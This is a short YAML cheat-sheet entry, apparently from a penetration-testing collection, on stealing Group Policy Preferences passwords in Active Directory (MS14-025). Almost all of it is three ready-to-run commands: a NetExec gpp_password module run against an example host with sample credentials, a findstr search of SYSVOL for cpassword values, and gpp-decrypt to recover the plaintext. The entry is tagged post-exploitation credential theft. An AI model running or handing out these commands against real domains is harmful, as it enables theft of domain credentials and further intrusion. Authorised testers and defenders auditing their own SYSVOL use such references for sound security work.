---
description: |
  Group Policy Preferences (GPP) passwords — extract and decrypt stored credentials from SYSVOL Group Policy XML files (MS14-025).
commands:
  - have: Credentials
    cmd: |
      nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' -M gpp_password
      findstr /S cpassword \\10.10.10.27\sysvol\*.xml
      gpp-decrypt "encrypted_cpassword_string"
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - Active_Directory
  - SMB
techniques:
  - Credential_Theft
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html
  - https://www.netexec.wiki/
  - https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30
---
